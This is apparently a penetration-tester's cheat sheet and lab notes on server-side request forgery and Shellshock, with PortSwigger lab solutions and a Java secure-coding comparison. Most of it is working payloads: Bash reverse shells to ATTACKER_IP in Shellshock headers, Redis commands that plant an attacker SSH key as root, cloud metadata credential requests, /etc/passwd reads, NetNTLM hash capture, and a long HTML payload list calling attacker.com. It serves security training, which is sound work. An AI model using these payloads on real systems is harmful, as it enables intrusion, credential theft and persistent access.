tactic: Multiple

**SSRF** is when an attacker causes the server to make HTTP requests to an unintended location  either internal services the attacker can't reach directly, or external systems to leak data. Burp Scanner flags this as `External service interaction (HTTP)`.

## Injection Points

- URL parameters (`?url=`, `?path=`, `?redirect=`, `?src=`, `?href=`)
- `stockApi`, `imageUrl`, `webhookUrl`, `fetch` style body params
- `Referer` header
- `Host` header (absolute URL in GET line)
- OAuth `logo_uri`, `jwks_uri`, `redirect_uris` in dynamic client registration
- HTML rendering endpoints (PDF generators, screenshot tools, image processors)
- HTML tags in user-controlled content rendered server-side (see HTML SSRF section)
## Checklist

### Detection

- [ ]  Point a URL param at Burp Collaborator:

```
	?url=http://OASTIFY.com
	?path=http://OASTIFY.com
	stockApi=http://OASTIFY.com
```

- [ ]  Test the `Referer` header:

```
	Referer: http://OASTIFY.com
```

- [ ]  Test absolute URL in GET line with modified `Host`:


```http
	GET https://target.com/
	Host: OASTIFY.com
```

### Internal Network Access

- [ ]  Hit localhost:

```
	?url=http://127.0.0.1/
	?url=http://localhost/
	?url=http://127.0.0.1:8080/admin
```

- [ ]  Scan internal subnet  bruteforce last octet:

```
	stockApi=http://192.168.0.§1§:8080/admin
```

- [ ]  Read local files via scheme:

```
	?url=file:///etc/passwd
	?url=php://filter/convert.base64-encode/resource=index.php
```

### Blacklist Bypass

- [ ]  Alternative localhost representations:

```
	http://127.1/
	http://2130706433/         ← decimal of 127.0.0.1
	http://017700000001/       ← octal
	http://0x7f000001/         ← hex
	http://127.0.0.1.nip.io/
```

- [ ]  Case variation: `http://127.1/AdMiN/`
- [ ]  URL encode blocked characters:

```
	http://127.1/%2561dmin     ← double encode 'a' → %2561
```

- [ ]  Use IP obfuscation tool: `https://h.43z.one/ipconverter/`

### Whitelist Bypass

- [ ]  Embed credentials with `@`:

```
	http://localhost:80%2523@stock.weliketoshop.net/admin/
```

```
`%2523` = double-encoded `#` → tricks whitelist into seeing the allowed domain
```

- [ ]  Use open redirect on a whitelisted domain to chain to internal:

```
	stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin
```

### Blind SSRF

- [ ]  No response body — confirm via out-of-band (Collaborator ping)
- [ ]  Use `Referer` header as vector:

```
	Referer: https://OASTIFY.com
```

- [ ]  Chain with Shellshock for RCE via blind SSRF:


```bash
	# Inject into User-Agent of an SSRF-triggered request
	User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Redis RCE via SSRF

- [ ]  Flush and write SSH key via internal Redis:

```
	?url=http://127.0.0.1:6379/flushall
	?url=http://127.0.0.1:6379/set ssh_key 'ssh-rsa AAAA... user@attacker'
	?url=http://127.0.0.1:6379/config set dir /root/.ssh
	?url=http://127.0.0.1:6379/config set dbfilename authorized_keys
	?url=http://127.0.0.1:6379/save
```

### Active Directory — NetNTLM Hash Capture

- [ ]  Set up Responder, point SSRF at your machine on a closed port:


```bash
	responder -I tun0 -wv
	# then trigger:
	?url=http://YOUR_KALI_IP/anything
```

```
Server authenticates → NetNTLMv2 hash captured → crack offline
```

### OAuth / Dynamic Client Registration

- [ ]  Register a client with SSRF payload in `logo_uri`:


```json
	{
	    "redirect_uris": ["https://example.com"],
	    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	}
```

- [ ]  Trigger fetch by visiting `/client/<client_id>/logo`

### HTML SSRF (Server-side HTML rendering)

- [ ]  If user content is rendered server-side (PDF, screenshot), inject HTML tags:

```html
	<iframe src="http://169.254.169.254/latest/meta-data/">
	<iframe src="file:///etc/passwd">
	<img src="http://OASTIFY.com">
	<link rel=stylesheet href="http://OASTIFY.com">
	<object data="file:///etc/passwd">
	<embed src="http://OASTIFY.com">
	<video src="http://OASTIFY.com">
	<audio src="http://OASTIFY.com">
	<svg><image href="http://OASTIFY.com/test.svg"></svg>
	<meta http-equiv="refresh" content="0; url=http://OASTIFY.com/">
	<portal src="http://OASTIFY.com">
```

- [ ]  PDF/iframe trick — render internal page inside generated report:

```html
	<iframe src='http://localhost:6566/secret' height='500' width='500'>
```

---

## Shellshock

**Shellshock** is a Bash vulnerability where specially crafted environment variables execute arbitrary commands. When chained with SSRF, it allows RCE if the internal server runs CGI scripts via Bash.


```bash
# The magic string — anything after the semicolon executes
() { :; }; /bin/cat /etc/passwd

# Via curl — inject into any HTTP header the server passes to Bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" http://internal-server/cgi-bin/script.sh
```

Inject the payload into headers that get passed as env vars: `User-Agent`, `Referer`, `Cookie`, custom headers.

---

## White Box Testing

**Vulnerable — URL param passed directly to HTTP client:**


```java
@GetMapping("/fetch")
public ResponseEntity<String> fetch(@RequestParam String url) {
    // ← no validation — attacker can point to any internal service
    RestTemplate restTemplate = new RestTemplate();
    String result = restTemplate.getForObject(url, String.class);
    return ResponseEntity.ok(result);
}
```

**Vulnerable — stockApi param used in server-side request:**

```java
@PostMapping("/product/stock")
public ResponseEntity<String> checkStock(@RequestBody StockRequest req) {
    // ← req.getStockApi() is user-controlled
    HttpURLConnection conn = (HttpURLConnection) new URL(req.getStockApi()).openConnection();
    conn.setRequestMethod("GET");
    String response = new BufferedReader(new InputStreamReader(conn.getInputStream()))
        .lines().collect(Collectors.joining());
    return ResponseEntity.ok(response);
}
```

**Vulnerable — Referer header used in server-side analytics request:**

```java
@GetMapping("/track")
public void track(HttpServletRequest request) {
    String referer = request.getHeader("Referer"); // ← attacker-controlled
    restTemplate.getForObject(referer, String.class); // ← blind SSRF
}
```

**Secure:**

```java
// Whitelist allowed hosts — reject everything else
private static final List<String> ALLOWED_HOSTS = List.of("api.internal.com", "cdn.company.com");

private void validateUrl(String url) throws MalformedURLException {
    URL parsed = new URL(url);
    String host = parsed.getHost();

    if (!ALLOWED_HOSTS.contains(host)) {
        throw new SecurityException("Forbidden host: " + host);
    }

    // Block private/loopback IP ranges
    InetAddress addr = InetAddress.getByName(host);
    if (addr.isLoopbackAddress() || addr.isSiteLocalAddress() || addr.isLinkLocalAddress()) {
        throw new SecurityException("Access to internal addresses is forbidden");
    }
}

@GetMapping("/fetch")
public ResponseEntity<String> fetch(@RequestParam String url) {
    validateUrl(url); // ← validate before any request is made
    return ResponseEntity.ok(restTemplate.getForObject(url, String.class));
}
```
## LAB

### Basic SSRF against another back-end system


> Need to scan internal network to find IP with 8080 port:

```
stockApi=http://192.168.0.34:8080/admin
```

### SSRF with blacklist-based input filter

>  _**Identify**_ the SSRF in the `stockAPI` parameter, and bypass the block by changing the URL target localhost and admin endpoint to: `http://127.1/%2561dmin`.

> Double URL encode characters in URL to **Obfuscate** the `a` to `%2561`, resulting in the bypass of the blacklist filter. 

```
stockApi=http://127.1/AdMiN/
```

### SSRF with filter bypass via open redirection vulnerability

> in the  blog posts notice that there is a nextproduct option
> notice that path URL param has a subdomain parameter /product/something


```
stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin
```

###  Blind SSRF with out-of-band detection


```
Referer: http://burpcollaborator
```

###  SSRF with whitelist-based input filter



```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/
```

###  Admin panel - Download report as PDF SSRF


[![image](https://user-images.githubusercontent.com/58632878/225074847-8daa2242-a99d-423f-888e-111755f04d9c.png)](https://user-images.githubusercontent.com/58632878/225074847-8daa2242-a99d-423f-888e-111755f04d9c.png)

```js
<iframe src='http://localhost:6566/secret' height='500' width='500'>
```


### Absolute GET URL + HOST SSRF

>_**Identify**_ SSRF flawed request parsing vulnerability by changing the `HOST` header to Collaborator server and providing an absolute URL in the GET request line and observe the response from the Collaborator server.


```
GET https://TARGET.net/
Host: OASTIFY.COM
```


### SSRF redirect_uris

>POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary white-list of callback URIs. Observe the redirect_uri.

```
POST /reg HTTP/1.1
Host: oauth-TARGET.web-security-academy.net
Content-Type: application/json
Content-Length: 206

{
"redirect_uris":["https://example.com"],
    "logo_uri" : "https://OASTIFY.COM",
	"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	
}  
```

# SHELL SHOCK



The Shell-shock problem is an example of an [arbitrary code execution (ACE)](http://en.wikipedia.org/wiki/Arbitrary_code_execution) vulnerability.

```bash
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```

The Shellshock problem specifically occurs when an attacker modifies the origin HTTP request to contain the magic `() { :; };` string

he attacker change the User-Agent header above from `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36` to simply `() { :; }; /bin/eject`.



```bash
() {:;}; /bin/cat /etc/passwd
```

basically its a vulnerability  bash command line interface which is commonly used in linux 
The Shellshock vulnerability happens because Bash incorrectly processes some environment variable


**SSRF Paylods for HTML**

```html
<iframe src="http://attacker.com">
<iframe src="http://attacker.com"></iframe>
<iframe src=file:///etc/passwd></iframe>
<style><iframe src="http://attacker.com">
<style><iframe src=file:///etc/passwd>
<style>@import url("http://attacker.com/test.css");</style>
<img src="http://attacker.com">
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<img src="x" onerror="document.write(document.location.href)"" />
<link rel=attachment href="file:///etc/passwd">
<link rel=stylesheet href="http://attacker.com">
<link rel=icon href="http://attacker.com/favicon.ico" type="image/x-icon">
<base href="http://attacker.com" />
<meta http-equiv="refresh" content="0; url=http://attacker.com/" />
<input type="image" src="http://attacker.com" />
<video src="http://attacker.com" />
<video src=file:///etc/passwd />
<video poster="http://attacker.com"></video>
<audio src="http://attacker.com" />
<audio src=file:///etc/passwd />
<audio><source src="http://attacker.com"/></audio>
<svg src="http://attacker.com" />
<svg><image href="http://attacker.com/test.svg" width="400" height="400"></svg>
<svg/onload=document.write(document.location.href)>
<object data="file:///etc/passwd">
<object data="http://attacker.com/test.pdf" type="application/pdf"></object>
<portal src="http://attacker.com" id=portal>
<portal src="file:///etc/passwd" id=portal>
<embed src="http://attacker.com" width="400" height="400">
<embed src="file:///etc/passwd" width="400" height="400">
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
<script> document.write(window.location) </script>
<script>document.write(JSON.stringify(window.location))</script>
<body background="http://attacker.com/test.png">
<div style="background-image: url('http://attacker.com/test.png'); width:400px, height:400px;"></div>
<table background="http://attacker.com/test.png"/>
<form action="http://attacker.com/submit" method="POST"><input type="submit"></form>
<applet codebase="http://attacker.com" code="Test.class" width="0" height="0"></applet>
<track src="http://attacker.com/sub.vtt" kind="subtitles" srclang="en" label="English">
```
# References


- https://github.com/DingyShark/BurpSuiteCertifiedPractitioner?tab=readme-ov-file#server-side-request-forgery-ssrf
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
